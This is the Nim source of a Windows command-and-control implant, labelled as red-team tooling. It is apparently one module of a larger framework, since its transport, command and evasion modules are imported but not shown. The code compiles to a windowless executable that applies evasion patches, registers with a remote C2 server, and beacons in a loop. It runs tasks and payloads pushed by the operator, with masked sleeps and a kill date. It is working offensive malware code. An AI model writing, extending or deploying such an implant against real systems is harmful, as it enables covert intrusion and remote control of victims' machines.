## REDTEAM C2 — Nim Windows agent
## Speaks the same HTTP/mTLS protocol as the Go agent.
## Build: nim compile --os:windows --cpu:amd64 --cc:gcc
##   --gcc.exe:x86_64-w64-mingw32-gcc --gcc.linkerexe:x86_64-w64-mingw32-gcc
##   -d:release -d:danger --app:gui --opt:size
##   -d:serverUrl=https://10.2.20.200:8443 -d:sleepSec=60 agent.nim

import std/[os, times, strutils, random]
import winim/lean
import config, transport, commands, evasion

proc killDateCheck() =
  when KillDate != "":
    try:
      let kd = parse(KillDate, "yyyy-MM-dd")
      if now() > kd:
        quit(0)
    except: discard

proc main() =
  randomize()

  # KillDate check
  killDateCheck()

  # Evasion patches
  when not defined(noEvasion):
    applyEvasion()

  # Init transport
  var t = newTransport()

  # Register — retry until success
  while true:
    if t.register(): break
    sleepMasked(30_000)

  # Beacon loop
  while true:
    killDateCheck()
    try:
      let tasks = t.beacon()
      for task in tasks:
        dispatchTask(t, task.id, task.typ, task.args, task.payload)
    except: discard
    sleepMasked(currentSleepMs())

when isMainModule:
  main()
